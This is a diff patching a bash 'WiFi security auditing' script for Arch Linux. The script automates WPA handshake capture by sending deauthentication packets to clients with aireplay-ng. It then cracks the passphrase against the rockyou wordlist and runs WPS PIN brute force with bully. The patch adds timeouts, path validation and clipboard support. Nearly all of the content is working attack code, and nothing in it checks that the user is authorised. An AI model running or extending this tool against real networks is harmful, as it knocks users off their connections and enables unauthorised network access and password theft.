@@ -4,6 +4,7 @@
 # Description: Automated WiFi Security Auditing Tool for Arch/Hyprland
 # Hardware:    Hardware Agnostic (Auto-detects Intel/Atheros/Realtek)
 # Author:      Elite DevOps
+# Version:     1.1.0 (Patched)
 # -----------------------------------------------------------------------------
 
 # strict mode
@@ -28,6 +29,9 @@ readonly HANDSHAKE_PREFIX="handshake"
 # Secure temp directory creation
 readonly TMP_DIR="$(mktemp -d -t wifi_audit_XXXXXX)"
 
+# Store script's PID for cleanup
+readonly SCRIPT_PID=$$
+
 # -----------------------------------------------------------------------------
 # UTILITIES
 # -----------------------------------------------------------------------------
@@ -41,7 +45,7 @@ log_err() { printf "${RED}[ERR]${NC} %s\n" "$1" >&2; }
 # -----------------------------------------------------------------------------
 if [[ $EUID -ne 0 ]]; then
     log_info "Elevating permissions to root (required for hardware access)..."
-    exec sudo --preserve-env=TERM,WAYLAND_DISPLAY,XDG_RUNTIME_DIR bash "$0" "$@"
+    exec sudo --preserve-env=TERM,WAYLAND_DISPLAY,XDG_RUNTIME_DIR,DISPLAY bash "$0" "$@"
     exit $?
 fi
 
@@ -57,14 +61,37 @@ else
     REAL_UID=$(id -u)
 fi
 
+# FIX #5: X11/Wayland compatible run_as_user
 run_as_user() {
-    local xdg=${XDG_RUNTIME_DIR:-/run/user/$REAL_UID}
-    local wayland=${WAYLAND_DISPLAY:-wayland-1}
+    local xdg="${XDG_RUNTIME_DIR:-/run/user/$REAL_UID}"
+    local -a env_args=("XDG_RUNTIME_DIR=$xdg")
     
-    sudo -u "$REAL_USER" \
-        XDG_RUNTIME_DIR="$xdg" \
-        WAYLAND_DISPLAY="$wayland" \
-        "$@"
+    # Detect display server and set appropriate variables
+    if [[ -n "${WAYLAND_DISPLAY:-}" ]]; then
+        env_args+=("WAYLAND_DISPLAY=$WAYLAND_DISPLAY")
+    fi
+    if [[ -n "${DISPLAY:-}" ]]; then
+        env_args+=("DISPLAY=$DISPLAY")
+    fi
+    
+    sudo -u "$REAL_USER" "${env_args[@]}" "$@"
+}
+
+# FIX #5: Unified clipboard function for X11/Wayland
+copy_to_clipboard() {
+    local text="$1"
+    
+    if [[ -n "${WAYLAND_DISPLAY:-}" ]] && command -v wl-copy &> /dev/null; then
+        echo -n "$text" | run_as_user wl-copy
+        return 0
+    elif [[ -n "${DISPLAY:-}" ]] && command -v xclip &> /dev/null; then
+        echo -n "$text" | run_as_user xclip -selection clipboard
+        return 0
+    elif [[ -n "${DISPLAY:-}" ]] && command -v xsel &> /dev/null; then
+        echo -n "$text" | run_as_user xsel --clipboard --input
+        return 0
+    fi
+    return 1
 }
 
 # -----------------------------------------------------------------------------
@@ -74,11 +101,22 @@ cleanup() {
     echo ""
     log_info "Initiating cleanup sequence..."
 
-    # Kill any lingering airodump processes (silence stderr to avoid "Quitting..." spam)
+    # FIX #3: Kill all child processes of this script first
+    pkill -P $SCRIPT_PID 2>/dev/null || true
+    
+    # Small delay for child processes to terminate
+    sleep 0.5
+
+    # Kill any lingering airodump/aireplay processes
     if pgrep -f "airodump-ng" > /dev/null; then
         pkill -f "airodump-ng" 2>/dev/null || true
-        wait 2>/dev/null || true
     fi
+    if pgrep -f "aireplay-ng" > /dev/null; then
+        pkill -f "aireplay-ng" 2>/dev/null || true
+    fi
+    
+    # Wait for processes to fully terminate
+    sleep 0.5
 
     # Cleanup Monitor Interface if it was set by this script
     if [[ -n "${MON_IFACE:-}" ]]; then
@@ -109,9 +147,9 @@ check_deps() {
     declare -A deps=( 
         ["aircrack-ng"]="aircrack-ng"
         ["bully"]="bully"
-        ["wl-copy"]="wl-clipboard"
         ["gawk"]="gawk"
         ["lspci"]="pciutils"
+        ["timeout"]="coreutils"
     )
     
     local missing_pkgs=()
@@ -129,6 +167,34 @@ check_deps() {
             exit 1
         }
     fi
+    
+    # Check for clipboard tools (non-fatal warning)
+    if [[ -n "${WAYLAND_DISPLAY:-}" ]]; then
+        if ! command -v wl-copy &> /dev/null; then
+            log_warn "wl-copy not found. Install 'wl-clipboard' for clipboard support."
+        fi
+    elif [[ -n "${DISPLAY:-}" ]]; then
+        if ! command -v xclip &> /dev/null && ! command -v xsel &> /dev/null; then
+            log_warn "xclip/xsel not found. Install for clipboard support."
+        fi
+    fi
+}
+
+# -----------------------------------------------------------------------------
+# PATH VALIDATION HELPER
+# -----------------------------------------------------------------------------
+# FIX #4: Validate user input paths for dangerous characters
+validate_path() {
+    local path="$1"
+    # Disallow dangerous shell metacharacters that could lead to injection
+    if [[ "$path" =~ [\`\$\(\)\;\&\|\<\>\!\*\?\[\]\{\}\'\"] ]]; then
+        return 1
+    fi
+    # Disallow null bytes and control characters
+    if [[ "$path" =~ [[:cntrl:]] ]]; then
+        return 1
+    fi
+    return 0
 }
 
 # -----------------------------------------------------------------------------
@@ -144,10 +210,14 @@ setup_directories() {
     echo "Default: $DEFAULT_HANDSHAKE_DIR"
     read -r -p "Press ENTER to use default, or type a custom path: " user_hs_path
 
+    # FIX #4: Validate user input path
     if [[ -z "$user_hs_path" ]]; then
         HANDSHAKE_DIR="$DEFAULT_HANDSHAKE_DIR"
-    else
+    elif validate_path "$user_hs_path"; then
         HANDSHAKE_DIR="${user_hs_path%/}"
+    else
+        log_warn "Invalid characters in path. Using default."
+        HANDSHAKE_DIR="$DEFAULT_HANDSHAKE_DIR"
     fi
 
     if [[ ! -d "$HANDSHAKE_DIR" ]]; then
@@ -171,10 +241,14 @@ setup_directories() {
     echo "Default: $DEFAULT_LIST_DIR"
     read -r -p "Press ENTER to use default, or type a custom path: " user_list_path
 
+    # FIX #4: Validate user input path
     if [[ -z "$user_list_path" ]]; then
         LIST_DIR="$DEFAULT_LIST_DIR"
-    else
+    elif validate_path "$user_list_path"; then
         LIST_DIR="${user_list_path%/}"
+    else
+        log_warn "Invalid characters in path. Using default."
+        LIST_DIR="$DEFAULT_LIST_DIR"
     fi
 
     if [[ ! -d "$LIST_DIR" ]]; then
@@ -323,7 +397,8 @@ scan_targets() {
     log_info "Starting network scan (2.4GHz & 5GHz)..."
     log_info "Scanning for 10 seconds. Please wait..."
 
-    airodump-ng --band abg -w "$TMP_DIR/$SCAN_PREFIX" --output-format csv --write-interval 1 "$MON_IFACE" > /dev/null 2>&1 &
+    # IMPROVEMENT: Added timeout protection for hung processes
+    timeout --signal=SIGTERM 20s airodump-ng --band abg -w "$TMP_DIR/$SCAN_PREFIX" --output-format csv --write-interval 1 "$MON_IFACE" > /dev/null 2>&1 &
     local pid=$!
     
     for i in {10..1}; do
@@ -332,9 +407,12 @@ scan_targets() {
     done
     printf "\rScanning... Done.\n"
     
-    kill "$pid" > /dev/null 2>&1
+    kill "$pid" > /dev/null 2>&1 || true
     wait "$pid" 2>/dev/null || true
-    sleep 0.5
+    
+    # FIX #1: Sync filesystem and increase delay to prevent race condition
+    sync
+    sleep 1
 
     local csv_file="$TMP_DIR/$SCAN_PREFIX-01.csv"
     if [[ ! -f "$csv_file" ]]; then
@@ -346,6 +424,7 @@ scan_targets() {
     echo ""
     
     local -a target_lines
+    # FIX #6: Improved channel parsing with validation
     mapfile -t target_lines < <(awk -F',' '
         /Station MAC/ {exit} 
         length($14) > 1 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {
@@ -355,14 +434,21 @@ scan_targets() {
             gsub(/^ +| +$/, "", $6);  # Privacy
             gsub(/^ +| +$/, "", $9);  # Power (Signal Strength)
             
-            # Derive Band from Channel
-            ch = $4 + 0;
-            if (ch >= 1 && ch <= 14) band="2.4G";
-            else if (ch >= 32) band="5G";
-            else band="N/A";
+            # FIX #6: Validate and derive Band from Channel
+            ch = int($4);
+            if (ch < 1 || ch > 196) {
+                band = "N/A";
+                ch = 0;
+            } else if (ch >= 1 && ch <= 14) {
+                band = "2.4G";
+            } else if (ch >= 32) {
+                band = "5G";
+            } else {
+                band = "N/A";
+            }
 
             # Output: BSSID, Power, CH, Band, SEC, ESSID
-            print $1","$9","$4","band","$6","$14
+            print $1","$9","ch","band","$6","$14
         }' "$csv_file")
 
     if [[ ${#target_lines[@]} -eq 0 ]]; then
@@ -412,6 +498,30 @@ scan_targets() {
 }
 
 # -----------------------------------------------------------------------------
+# ROCKYOU FINDER
+# -----------------------------------------------------------------------------
+# IMPROVEMENT: Search common locations for rockyou.txt
+find_rockyou() {
+    local paths=(
+        "/usr/share/wordlists/rockyou.txt"
+        "/usr/share/wordlists/rockyou.txt.gz"
+        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
+        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.gz"
+        "$REAL_HOME/wordlists/rockyou.txt"
+        "$REAL_HOME/.wordlists/rockyou.txt"
+        "/opt/wordlists/rockyou.txt"
+        "/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt"
+    )
+    for p in "${paths[@]}"; do
+        if [[ -f "$p" ]]; then
+            echo "$p"
+            return 0
+        fi
+    done
+    return 1
+}
+
+# -----------------------------------------------------------------------------
 # WORDLIST GENERATION
 # -----------------------------------------------------------------------------
 prepare_wordlist() {
@@ -427,22 +537,44 @@ prepare_wordlist() {
         FINAL_WORDLIST="$COMBINED_WORDLIST"
     else
         log_warn "No files found in $LIST_DIR."
-        echo "Options:"
-        echo "1) Use built-in RockYou (/usr/share/wordlists/rockyou.txt)"
-        echo "2) Enter custom path manually"
-        read -r -p "Selection [1/2] (Default 1): " wl_select
-        wl_select=${wl_select:-1}
         
-        if [[ "$wl_select" == "2" ]]; then
-             read -r -p "Enter full path to wordlist: " custom_wl
-             if [[ -f "$custom_wl" ]]; then
-                 FINAL_WORDLIST="$custom_wl"
-             else
-                 log_err "File not found."
-                 FINAL_WORDLIST=""
-             fi
+        # IMPROVEMENT: Try to find rockyou in common locations
+        local rockyou_path=""
+        if rockyou_path=$(find_rockyou); then
+            echo "Options:"
+            echo "1) Use detected RockYou ($rockyou_path)"
+            echo "2) Enter custom path manually"
+            read -r -p "Selection [1/2] (Default 1): " wl_select
+            wl_select=${wl_select:-1}
+            
+            if [[ "$wl_select" == "2" ]]; then
+                read -r -p "Enter full path to wordlist: " custom_wl
+                if [[ -f "$custom_wl" ]]; then
+                    FINAL_WORDLIST="$custom_wl"
+                else
+                    log_err "File not found."
+                    FINAL_WORDLIST=""
+                fi
+            else
+                # Handle .gz files
+                if [[ "$rockyou_path" == *.gz ]]; then
+                    log_info "Decompressing rockyou.txt.gz..."
+                    FINAL_WORDLIST="$TMP_DIR/rockyou.txt"
+                    zcat "$rockyou_path" > "$FINAL_WORDLIST"
+                else
+                    FINAL_WORDLIST="$rockyou_path"
+                fi
+            fi
         else
-             FINAL_WORDLIST="/usr/share/wordlists/rockyou.txt"
+            log_warn "RockYou wordlist not found in common locations."
+            log_info "Common install: sudo pacman -S seclists (or download rockyou.txt manually)"
+            read -r -p "Enter full path to wordlist (or press ENTER to skip cracking): " custom_wl
+            if [[ -n "$custom_wl" && -f "$custom_wl" ]]; then
+                FINAL_WORDLIST="$custom_wl"
+            else
+                log_warn "No wordlist provided. Cracking will be skipped."
+                FINAL_WORDLIST=""
+            fi
         fi
     fi
 }
@@ -456,8 +588,8 @@ perform_client_micro_scan() {
     # CRITICAL FIX: Delete previous scan files to force airodump to write to -01.csv again
     rm -f "$TMP_DIR/$CLIENT_SCAN_PREFIX"*
 
-    # Run airodump-ng in background to capture clients
-    airodump-ng --bssid "$TARGET_BSSID" --channel "$TARGET_CH" -w "$TMP_DIR/$CLIENT_SCAN_PREFIX" --output-format csv "$MON_IFACE" >/dev/null 2>&1 &
+    # IMPROVEMENT: Added timeout protection
+    timeout --signal=SIGTERM 10s airodump-ng --bssid "$TARGET_BSSID" --channel "$TARGET_CH" -w "$TMP_DIR/$CLIENT_SCAN_PREFIX" --output-format csv "$MON_IFACE" >/dev/null 2>&1 &
     local scan_pid=$!
     
     # Wait 5 seconds with visual indicator
@@ -470,6 +602,10 @@ perform_client_micro_scan() {
     # Kill and clean up
     kill "$scan_pid" >/dev/null 2>&1 || true
     wait "$scan_pid" 2>/dev/null || true
+    
+    # FIX #1: Sync and wait for file writes
+    sync
+    sleep 0.5
 }
 
 get_connected_clients() {
@@ -479,12 +615,29 @@ get_connected_clients() {
     local initial_csv="$TMP_DIR/$SCAN_PREFIX-01.csv"
     local source_csv=""
 
-    if [[ -n "$custom_csv" && -f "$custom_csv" ]]; then
-        source_csv="$custom_csv"
-    elif [[ -f "$specific_csv" ]]; then
-        source_csv="$specific_csv"
-    else
-        source_csv="$initial_csv"
+    # FIX #2: Add retry logic for user-generated capture file
+    if [[ -n "$custom_csv" ]]; then
+        local attempts=0
+        while [[ ! -f "$custom_csv" && $attempts -lt 5 ]]; do
+            sleep 1
+            ((attempts++))
+        done
+        if [[ -f "$custom_csv" ]]; then
+            source_csv="$custom_csv"
+        fi
+    fi
+    
+    # Fallback to other sources if custom_csv not available
+    if [[ -z "$source_csv" ]]; then
+        if [[ -f "$specific_csv" ]]; then
+            source_csv="$specific_csv"
+        elif [[ -f "$initial_csv" ]]; then
+            source_csv="$initial_csv"
+        else
+            # No source file found, return empty
+            CONNECTED_CLIENTS=()
+            return
+        fi
     fi
 
     # Find stations associated with the target BSSID
@@ -513,8 +666,8 @@ get_connected_clients() {
 # -----------------------------------------------------------------------------
 attack_wpa_handshake() {
     prepare_wordlist
-    if [[ ! -f "$FINAL_WORDLIST" ]]; then
-        log_err "No valid wordlist found. Aborting crack attempt (capture only)."
+    if [[ -z "${FINAL_WORDLIST:-}" ]] || [[ ! -f "${FINAL_WORDLIST:-}" ]]; then
+        log_warn "No valid wordlist found. Capture will proceed but cracking will be skipped."
     fi
 
     local timestamp=$(date +%Y%m%d_%H%M%S)
@@ -528,17 +681,14 @@ attack_wpa_handshake() {
     echo "3. Paste and run it."
     echo "4. Return here and press ENTER."
     
-    if command -v wl-copy &> /dev/null; then
-        echo "$record_cmd" | run_as_user wl-copy
+    # FIX #5: Use unified clipboard function (X11/Wayland compatible)
+    if copy_to_clipboard "$record_cmd"; then
         log_success "Command copied to clipboard!"
     else
-        log_warn "wl-copy not found. Copy manually:"
+        log_warn "Clipboard tool not available. Copy manually:"
         echo "$record_cmd"
     fi
 
-    # Removed conflicting internal scan:
-    # We now rely on the user's running command in the other terminal to populate data.
-    
     read -r -p "Press ENTER when recorder is running..."
 
     # --- CLIENT SELECTION LOOP ---
@@ -607,10 +757,11 @@ attack_wpa_handshake() {
         local burst=3
         log_info "Sending $burst groups of deauth packets..."
 
+        # IMPROVEMENT: Added timeout protection for aireplay
         if [[ -n "$target_mac" ]]; then
-            aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -c "$target_mac" "$MON_IFACE"
+            timeout --signal=SIGTERM 30s aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -c "$target_mac" "$MON_IFACE" || true
         else
-            aireplay-ng -0 "$burst" -a "$TARGET_BSSID" "$MON_IFACE"
+            timeout --signal=SIGTERM 30s aireplay-ng -0 "$burst" -a "$TARGET_BSSID" "$MON_IFACE" || true
         fi
 
         echo ""
@@ -637,7 +788,7 @@ attack_wpa_handshake() {
     # CRACKING LOGIC
     local cap_file="${capture_base}-01.cap"
     if [[ ! -f "$cap_file" ]]; then
-         cap_file=$(find "$HANDSHAKE_DIR" -name "${TARGET_ESSID_SAFE}_${timestamp}*.cap" | head -n 1)
+         cap_file=$(find "$HANDSHAKE_DIR" -name "${TARGET_ESSID_SAFE}_${timestamp}*.cap" 2>/dev/null | head -n 1)
     fi
 
     if [[ -f "$cap_file" ]]; then
@@ -645,7 +796,7 @@ attack_wpa_handshake() {
          log_info "Capture file ownership transferred to $REAL_USER."
     fi
 
-    if [[ -f "$FINAL_WORDLIST" && -f "$cap_file" ]]; then
+    if [[ -n "${FINAL_WORDLIST:-}" ]] && [[ -f "${FINAL_WORDLIST:-}" ]] && [[ -f "$cap_file" ]]; then
         log_info "Step 3: Cracking Password..."
         
         local key_file="$TMP_DIR/cracked_key.txt"
@@ -660,9 +811,9 @@ attack_wpa_handshake() {
             
             echo ""
             printf "${GREEN}${BOLD}**************************************************${NC}\n"
-            printf "${GREEN}${BOLD}* *${NC}\n"
-            printf "${GREEN}${BOLD}* PASSWORD CRACKED !!!               *${NC}\n"
-            printf "${GREEN}${BOLD}* *${NC}\n"
+            printf "${GREEN}${BOLD}*                                                *${NC}\n"
+            printf "${GREEN}${BOLD}*           PASSWORD CRACKED !!!                 *${NC}\n"
+            printf "${GREEN}${BOLD}*                                                *${NC}\n"
             printf "${GREEN}${BOLD}**************************************************${NC}\n"
             echo ""
             printf "${CYAN}${BOLD}   PASSPHRASE:  %s${NC}\n" "$cracked_key"
@@ -670,22 +821,28 @@ attack_wpa_handshake() {
             printf "${GREEN}${BOLD}**************************************************${NC}\n"
             echo ""
             
-            # Auto-copy to clipboard
-            if command -v wl-copy &> /dev/null; then
-                 echo -n "$cracked_key" | run_as_user wl-copy
+            # FIX #5: Auto-copy to clipboard (X11/Wayland compatible)
+            if copy_to_clipboard "$cracked_key"; then
                  log_success "Password copied to clipboard!"
             fi
         else
             log_warn "Password not found in the provided wordlist."
+            log_info "Capture file saved at: $cap_file"
+            log_info "You can try cracking later with: aircrack-ng -w <wordlist> $cap_file"
         fi
+    elif [[ -f "$cap_file" ]]; then
+        log_info "Capture file saved at: $cap_file"
+        log_info "No wordlist available. Crack later with: aircrack-ng -w <wordlist> $cap_file"
     fi
 }
 
 attack_wps() {
     log_info "Starting WPS Scan via 'wash'..."
-    timeout 10s wash -i "$MON_IFACE" | grep "$TARGET_BSSID" || true
+    # IMPROVEMENT: Added timeout protection
+    timeout --signal=SIGTERM 15s wash -i "$MON_IFACE" 2>/dev/null | grep "$TARGET_BSSID" || true
     
     log_info "Attempting WPS PIXIE/Bruteforce via 'bully'..."
+    log_warn "This may take a very long time. Press Ctrl+C to abort."
     bully -b "$TARGET_BSSID" -c "$TARGET_CH" "$MON_IFACE" -v 3
 }
 
